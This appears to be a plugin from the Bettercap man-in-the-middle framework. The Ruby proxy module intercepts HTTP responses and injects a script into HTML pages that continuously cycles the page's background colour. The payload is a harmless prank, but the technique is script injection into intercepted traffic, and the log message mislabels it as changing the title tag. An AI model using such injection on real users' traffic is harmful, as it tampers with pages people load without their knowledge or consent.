=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
class Rainbow < Proxy::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      Logger.info "Hacking http://#{request.host}#{request.url} title tag"
      # make sure to use sub! or gsub! to update the instance
      response.body.sub!( '<head>', '<head> <script>
	
	var tick = 0;
	var rate = 0.1;
	window.onload=function(){
		setInterval(function(){
			tick=tick + rate;
			var red = Math.sin(tick) * 127 + 128;
			var green = Math.sin(tick + 90) * 127 + 128;
			var blue = Math.sin(tick + 270) * 127 + 128;
			red=parseInt(red);
			green=parseInt(green);
			blue=parseInt(blue);
			document.body.style.backgroundColor="rgb("+red+","+green+","+blue+")";
		},50);
	};
</script>' )
    end
  end
end
